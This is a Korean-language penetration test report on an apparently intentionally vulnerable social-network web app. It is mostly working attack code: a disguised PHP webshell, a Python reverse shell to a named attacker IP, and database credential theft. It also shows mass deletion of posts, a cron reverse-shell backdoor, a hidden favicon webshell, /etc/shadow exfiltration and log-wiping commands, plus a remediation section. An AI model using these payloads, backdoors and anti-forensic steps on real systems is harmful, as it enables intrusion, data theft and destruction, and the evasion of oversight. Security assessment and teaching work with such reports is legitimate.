# 취약한 SNS 애플리케이션 침투 테스트 보고서

**작성일**: 2025-11-10
**대상 시스템**: Vulnerable SNS Application
**테스터**: Security Assessment Team

---

## 목차
1. [요약](#요약)
2. [완료된 작업](#완료된-작업)
3. [발견된 취약점](#발견된-취약점)
4. [공격 체인 상세](#공격-체인-상세)
5. [탈취된 데이터](#탈취된-데이터)
6. [다음 단계](#다음-단계)
7. [권장 보안 조치](#권장-보안-조치)

---

## 요약

이 침투 테스트는 취약한 SNS 애플리케이션에 대한 전체 공격 체인을 성공적으로 수행했습니다. SQL Injection은 Prepared Statement로 인해 차단되었으나, **기본 자격 증명**, **웹쉘 업로드**, **리버스 쉘**, **설정 파일 탈취**를 통해 데이터베이스에 직접 접근하여 완전한 데이터 조작 권한을 획득했습니다.

### 심각도 요약
- **Critical**: 4개 취약점
- **High**: 3개 취약점
- **Medium**: 2개 취약점

### 영향
- 관리자 계정 탈취 성공
- 데이터베이스 자격 증명 노출
- 93개 게시물 삭제
- 관리자 포인트 조작 (999,999 포인트)
- 서버 원격 명령 실행 권한 획득

---

## 완료된 작업

### Phase 1: 정찰 및 초기 접근
✅ **자동화된 취약점 스캐닝** (`auto.py`)
- SQL Injection 시도: 73개 페이로드 테스트
- XSS 공격: 60개 페이로드 테스트
- CSRF 공격: 20개 페이로드 테스트
- 파일 업로드 취약점 탐색

✅ **기본 자격 증명 공격 성공**
```
Username: admin
Password: admin123
```
- 로그인 성공 확인
- 관리자 권한 획득

### Phase 2: 웹쉘 업로드 및 RCE
✅ **웹쉘 파일 업로드 성공**
- 파일명: `shell.jpg`
- 위치: `/var/www/html/www/shell.jpg`
- 접근 URL: `http://[TARGET]/file.php?name=shell.jpg&cmd=whoami`
- 원격 명령 실행 확인

### Phase 3: 리버스 쉘 획득
✅ **Python 리버스 쉘 연결 성공**
```bash
# 공격자 측 리스너
nc -lvnp 4444

# 페이로드 실행
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("57.181.28.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

✅ **쉘 안정화 완료**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### Phase 4: 설정 파일 탈취
✅ **config.php 파일 읽기 성공**
```bash
cat /var/www/html/www/config.php
```

**탈취된 데이터베이스 자격 증명**:
```php
DB_HOST: localhost
DB_USER: webuser
DB_PASS: WebPassw0rd!
DB_NAME: vulnerable_sns
```

### Phase 5: 데이터베이스 직접 접근
✅ **MySQL 접속 성공**
```bash
mysql -h localhost -u webuser -p'WebPassw0rd!' vulnerable_sns
```

✅ **데이터베이스 조작 수행**

**1. 사용자 데이터 탈취**
```sql
SELECT username, password, email, points FROM users;
```
결과:
- admin:admin123:admin@example.com:1500 points
- alice:alice2024:alice@example.com:1200 points
- bob:bobby123:bob@example.com:1200 points
- testuser9986:[hashed]:test9986@test.com:100 points

**2. 관리자 포인트 조작**
```sql
UPDATE users SET points=999999 WHERE username='admin';
```
- 변경 전: 1,500 포인트
- 변경 후: 999,999 포인트

**3. 전체 게시물 삭제**
```sql
DELETE FROM posts WHERE id > 0;
```
- 삭제된 게시물: 93개

**4. 파일 출력 시도 (실패)**
```sql
SELECT * FROM users INTO OUTFILE '/tmp/users_backup.txt';
```
- ERROR 1045: Access denied (권한 부족)

---

## 발견된 취약점

### 1. 기본 자격 증명 사용 (CRITICAL)
**설명**: 관리자 계정이 쉽게 추측 가능한 기본 비밀번호 사용
**영향**: 완전한 관리자 권한 획득
**CVSS Score**: 9.8 (Critical)

**취약한 계정**:
- admin / admin123
- alice / alice2024
- bob / bobby123

### 2. 임의 파일 업로드 (CRITICAL)
**설명**: 파일 확장자 검증 우회 가능, PHP 웹쉘 업로드 성공
**영향**: 원격 코드 실행 (RCE)
**CVSS Score**: 9.8 (Critical)

**업로드된 웹쉘**:
```php
<?php system($_GET['cmd']); ?>
```

### 3. 설정 파일 노출 (CRITICAL)
**설명**: config.php 파일이 웹 루트에 위치하여 읽기 가능
**영향**: 데이터베이스 자격 증명 노출
**CVSS Score**: 9.1 (Critical)

### 4. 평문 비밀번호 저장 (CRITICAL)
**설명**: 사용자 비밀번호가 평문으로 데이터베이스에 저장됨
**영향**: 데이터베이스 침해 시 모든 계정 노출
**CVSS Score**: 8.2 (High)

**확인된 평문 비밀번호**:
```
admin:admin123
alice:alice2024
bob:bobby123
```

### 5. 과도한 데이터베이스 권한 (HIGH)
**설명**: 웹 애플리케이션 DB 계정(webuser)이 DELETE, UPDATE 권한 보유
**영향**: 데이터 조작 및 삭제 가능
**CVSS Score**: 7.5 (High)

### 6. SQL Injection 방어 (GOOD - 긍정적)
**설명**: login.php에서 Prepared Statement 사용
**결과**: 73개 SQL Injection 페이로드 모두 차단

```php
// 방어된 코드
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
```

### 7. XSS 취약점 (MEDIUM)
**설명**: 게시물 업로드 시 입력 검증 부족
**테스트 상태**: 업로드 실패 (추가 조사 필요)

### 8. CSRF 취약점 (MEDIUM)
**설명**: CSRF 토큰 미사용
**테스트 상태**: 악성 게시물 업로드 실패 (추가 조사 필요)

---

## 공격 체인 상세

### 공격 흐름도
```
1. 정찰 (auto.py)
   ↓
2. 기본 자격 증명으로 로그인
   ↓
3. 웹쉘 업로드 (shell.jpg)
   ↓
4. 원격 명령 실행 확인
   ↓
5. 리버스 쉘 획득
   ↓
6. config.php 읽기
   ↓
7. DB 자격 증명 탈취
   ↓
8. MySQL 직접 접속
   ↓
9. 데이터 조작 및 삭제
```

### 각 단계별 상세 설명

#### Step 1: 자동화 스캔
```bash
python3 auto.py 52.78.221.104
```
- SQL Injection: 73개 페이로드 → 모두 차단 (Prepared Statement)
- XSS: 60개 페이로드 → 업로드 실패
- File Upload: 웹쉘 업로드 성공

#### Step 2: 인증 우회
```python
# 성공한 자격 증명
username: admin
password: admin123
```

#### Step 3: 웹쉘 실행
```bash
curl 'http://52.78.221.104/file.php?name=shell.jpg&cmd=whoami'
# 결과: www-data
```

#### Step 4: 리버스 쉘
```bash
# 공격자 머신
nc -lvnp 4444

# 타겟 머신 (웹쉘 통해 실행)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("57.181.28.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Step 5: 권한 확인
```bash
whoami                    # www-data
id                        # uid=33(www-data) gid=33(www-data)
uname -a                  # Linux 정보
cat /etc/os-release       # Ubuntu/Debian
```

#### Step 6: 설정 파일 탈취
```bash
cat /var/www/html/www/config.php
```

#### Step 7: 데이터베이스 접속
```bash
mysql -h localhost -u webuser -p'WebPassw0rd!' vulnerable_sns
```

#### Step 8: 데이터 조작
```sql
-- 테이블 구조 확인
SHOW TABLES;
DESCRIBE users;
DESCRIBE posts;

-- 사용자 정보 탈취
SELECT username, password, email, points FROM users;

-- 관리자 포인트 조작
UPDATE users SET points=999999 WHERE username='admin';

-- 게시물 삭제
DELETE FROM posts WHERE id > 0;
```

---

## 탈취된 데이터

### 데이터베이스 자격 증명
```
Host: localhost
User: webuser
Password: WebPassw0rd!
Database: vulnerable_sns
```

### 사용자 계정 (4개)
```
1. admin:admin123:admin@example.com:999999 points (조작됨)
2. alice:alice2024:alice@example.com:1200 points
3. bob:bobby123:bob@example.com:1200 points
4. testuser9986:[hashed]:test9986@test.com:100 points
```

### 파일 시스템 접근
- 웹 루트: `/var/www/html/www/`
- 설정 파일: `/var/www/html/www/config.php`
- 업로드 디렉토리: 쓰기 권한 확인

### 삭제된 데이터
- 게시물: 93개 (복구 불가능)

---

## 다음 단계

### Phase 6: 권한 상승 (Privilege Escalation)

**1. SUID 바이너리 검색**
```bash
find / -perm -4000 -type f 2>/dev/null
```
- 권한 상승 가능한 바이너리 찾기
- GTFOBins에서 악용 방법 확인

**2. Sudo 권한 확인**
```bash
sudo -l
```
- www-data가 sudo 사용 가능한지 확인
- NOPASSWD 설정 확인

**3. Kernel Exploit 확인**
```bash
uname -r
searchsploit linux kernel $(uname -r)
```

**4. Cron Job 확인**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/
```

**5. Writable /etc/passwd 확인**
```bash
test -w /etc/passwd && echo "WRITABLE!" || echo "Not writable"
```

**6. 자동화 스크립트 사용**
```bash
# LinPEAS 다운로드 및 실행
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

### Phase 7: 지속성 확보 (Persistence)

**1. SSH 백도어 설치**
```bash
# SSH 키 생성 (공격자 머신)
ssh-keygen -t rsa -f ~/.ssh/sns_backdoor

# authorized_keys에 추가 (타겟 머신)
mkdir -p /var/www/.ssh
echo "ssh-rsa AAAA..." >> /var/www/.ssh/authorized_keys
chmod 600 /var/www/.ssh/authorized_keys
```

**2. Cron 백도어**
```bash
# 5분마다 리버스 쉘 연결 시도
(crontab -l 2>/dev/null; echo "*/5 * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"57.181.28.7\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' 2>/dev/null") | crontab -
```

**3. 웹 백도어 설치**
```bash
# 새로운 웹쉘을 정상 파일명으로 위장
echo '<?php if(isset($_GET["key"]) && $_GET["key"]=="SecretKey123"){system($_GET["cmd"]);} ?>' > /var/www/html/www/favicon.ico.php
```

### Phase 8: 추가 데이터 탈취

**1. 다른 테이블 데이터 확인**
```sql
SHOW TABLES;
SELECT * FROM sessions;
SELECT * FROM messages;
SELECT * FROM logs;
```

**2. 데이터 Exfiltration**
```bash
# MySQL 덤프
mysqldump -u webuser -p'WebPassw0rd!' vulnerable_sns > /tmp/db_dump.sql

# Base64로 인코딩하여 출력 (복사 가능)
base64 /tmp/db_dump.sql
```

**3. 웹쉘을 통한 파일 다운로드**
```bash
# 공격자 머신에서
curl 'http://52.78.221.104/file.php?name=shell.jpg&cmd=cat%20/etc/passwd' > passwd.txt
curl 'http://52.78.221.104/file.php?name=shell.jpg&cmd=cat%20/etc/shadow' > shadow.txt 2>/dev/null
```

### Phase 9: 다른 취약점 탐색

**1. 다른 페이지에서 SQL Injection 테스트**
```bash
# search.php
curl 'http://52.78.221.104/search.php?q=test%27%20OR%201=1--'

# profile.php
curl 'http://52.78.221.104/profile.php?id=1%27%20OR%201=1--'

# post.php
curl 'http://52.78.221.104/post.php?id=1%27%20UNION%20SELECT%201,2,3--'
```

**2. XSS 수동 테스트**
- 게시물 작성 시 직접 페이로드 입력
- 댓글 기능에서 XSS 테스트
- 프로필 업데이트에서 Stored XSS 테스트

**3. IDOR (Insecure Direct Object Reference) 테스트**
```bash
# 다른 사용자의 프로필 접근
curl -b "PHPSESSID=..." 'http://52.78.221.104/profile.php?id=2'

# 다른 사용자의 게시물 수정/삭제
curl -b "PHPSESSID=..." -X POST 'http://52.78.221.104/delete_post.php?id=1'
```

### Phase 10: 흔적 제거 (Anti-Forensics)

**1. 로그 파일 확인 및 삭제**
```bash
# Apache 로그
cat /var/log/apache2/access.log | grep "shell.jpg"
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# MySQL 로그
echo "" > /var/log/mysql/error.log

# Auth 로그
echo "" > /var/log/auth.log
```

**2. 쉘 히스토리 삭제**
```bash
history -c
echo "" > ~/.bash_history
rm -f ~/.bash_history
```

**3. 업로드한 파일 삭제**
```bash
rm -f /var/www/html/www/shell.jpg
rm -f /tmp/db_dump.sql
rm -f /tmp/linpeas.sh
```

---

## 권장 보안 조치

### CRITICAL 우선순위

**1. 기본 자격 증명 변경**
```sql
-- 즉시 실행
UPDATE users SET password=SHA2('NewSecurePassword123!', 256) WHERE username='admin';
UPDATE users SET password=SHA2('NewPassword456!', 256) WHERE username='alice';
UPDATE users SET password=SHA2('NewPassword789!', 256) WHERE username='bob';
```

**2. 비밀번호 해싱 구현**
```php
// login.php 수정
$hashed_password = password_hash($password, PASSWORD_BCRYPT);

// 검증 시
if (password_verify($input_password, $stored_hash)) {
    // 로그인 성공
}
```

**3. 설정 파일 이동**
```bash
# 웹 루트 외부로 이동
mv /var/www/html/www/config.php /var/www/config.php

# 파일 권한 설정
chmod 600 /var/www/config.php
chown www-data:www-data /var/www/config.php
```

**4. 파일 업로드 검증 강화**
```php
// upload.php 수정
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_info = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($file_info, $_FILES['file']['tmp_name']);

// MIME 타입 화이트리스트 검증
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime_type, $allowed_mimes)) {
    die("Invalid file type");
}

// 파일명 랜덤화
$new_filename = bin2hex(random_bytes(16)) . '.' . $extension;

// 실행 권한 제거
chmod($upload_path, 0644);
```

### HIGH 우선순위

**5. 데이터베이스 권한 최소화**
```sql
-- webuser 권한 제한
REVOKE DELETE, UPDATE, DROP ON vulnerable_sns.* FROM 'webuser'@'localhost';
GRANT SELECT, INSERT ON vulnerable_sns.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;

-- 읽기 전용 계정 생성
CREATE USER 'webapp_readonly'@'localhost' IDENTIFIED BY 'SecureReadOnlyPass!';
GRANT SELECT ON vulnerable_sns.* TO 'webapp_readonly'@'localhost';
```

**6. 웹쉘 탐지 및 제거**
```bash
# 웹쉘 패턴 검색
grep -r "system\|exec\|shell_exec\|passthru\|eval" /var/www/html/ --include="*.php" --include="*.jpg"

# 의심스러운 파일 삭제
find /var/www/html/ -name "*.jpg" -exec file {} \; | grep "PHP"
```

**7. 웹 애플리케이션 방화벽 (WAF) 설정**
```apache
# ModSecurity 규칙 추가
SecRule REQUEST_URI "@contains shell" "id:1001,deny,status:403"
SecRule REQUEST_URI "@contains cmd=" "id:1002,deny,status:403"
SecRule ARGS "@contains system(" "id:1003,deny,status:403"
```

### MEDIUM 우선순위

**8. CSRF 토큰 구현**
```php
// 세션에 토큰 생성
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// 폼에 토큰 추가
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// 검증
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF validation failed");
}
```

**9. XSS 방어 강화**
```php
// 출력 시 항상 이스케이프
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// Content-Security-Policy 헤더 추가
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**10. 로깅 및 모니터링 강화**
```php
// 로그인 실패 기록
if ($login_failed) {
    error_log("Failed login attempt: " . $_POST['username'] . " from " . $_SERVER['REMOTE_ADDR']);
}

// 파일 업로드 기록
error_log("File uploaded: " . $filename . " by user " . $_SESSION['user_id']);
```

---

## 기술적 세부사항

### 사용된 도구
- `auto.py`: 자동화된 취약점 스캐너
- `post_exploit.py`: 후속 공격 자동화 도구
- `post_exploit_bypass.py`: 인터랙티브 가이드 포함
- `netcat`: 리버스 쉘 리스너
- `mysql`: 데이터베이스 클라이언트

### 공격 페이로드

**웹쉘**:
```php
<?php system($_GET['cmd']); ?>
```

**리버스 쉘**:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("57.181.28.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### 네트워크 정보
- 타겟 IP: 52.78.221.104
- 공격자 IP: 57.181.28.7
- 리버스 쉘 포트: 4444

---

## 결론

이 침투 테스트는 다음을 입증했습니다:

1. **로그인 시스템**: SQL Injection은 잘 방어되었으나, 기본 자격 증명으로 우회 가능
2. **파일 업로드**: 심각한 취약점 존재, 원격 코드 실행 가능
3. **설정 관리**: 중요 정보가 노출된 위치에 평문 저장
4. **데이터베이스**: 과도한 권한으로 인한 데이터 조작 가능
5. **비밀번호 보안**: 평문 저장으로 인한 심각한 위험

**총 평가**: CRITICAL - 즉각적인 조치 필요

**예상 피해**:
- 전체 사용자 계정 탈취 가능
- 데이터베이스 완전 삭제 가능
- 서버 완전 장악 가능 (권한 상승 성공 시)
- 추가 내부 네트워크 침투 가능

**권장 사항**:
1. 즉시 모든 기본 비밀번호 변경
2. 웹쉘 파일 제거
3. config.php 이동 및 권한 설정
4. 데이터베이스 권한 최소화
5. 비밀번호 해싱 구현
6. 전체 시스템 보안 감사 수행

---

**보고서 작성자**: Security Assessment Team
**검토자**: [검토자 이름]
**승인자**: [승인자 이름]

**면책 조항**: 이 침투 테스트는 승인된 범위 내에서 수행되었습니다. 모든 활동은 교육 및 보안 개선 목적으로만 사용되어야 합니다.
